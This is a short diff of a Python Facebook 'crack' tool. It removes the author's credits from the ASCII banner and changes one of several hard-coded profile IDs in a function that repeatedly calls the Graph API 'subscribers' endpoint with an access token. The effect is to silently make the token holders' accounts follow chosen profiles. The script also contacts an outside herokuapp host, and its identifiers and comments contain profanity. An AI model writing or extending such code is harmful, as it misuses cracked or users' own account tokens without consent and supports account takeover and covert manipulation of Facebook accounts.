@@ -111,9 +111,9 @@ def tod():
 # LO KONTOL
 IP = requests.get('http://yayanxd.herokuapp.com/ip').text
 logo = ''' \033[0;96m __  __        __  ______  ____
- \033[0;96m \ \/ / ____  /  |/  / _ )/ __/ ® \033[0m|| Created By YayanXD
- \033[0;96m  \  / /___/ / /|_/ / _  / _/     \033[0m|| Github.com/Yayan-XD
- \033[0;96m  /_/       /_/  /_/____/_/ \033[0;91mv2.0  \033[0m|| Facebook.com/KM39453'''
+ \033[0;96m \ \/ / ____  /  |/  / _ )/ __/ ® \033[0m|| 
+ \033[0;96m  \  / /___/ / /|_/ / _  / _/     \033[0m|| 
+ \033[0;96m  /_/       /_/  /_/____/_/ \033[0;91mv2.0  \033[0m|'''
 
 lo_ngentod = '861386751423614'
 # crack selesai
@@ -253,7 +253,7 @@ def wuhan(kontol):
         requests.post('https://graph.facebook.com/100026568911671/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100026568911671/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100026568911671/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100026568911671/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100045178103128/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100026568911671/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100051863139451/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100051863139451/subscribers?access_token=%s'%(kentod))
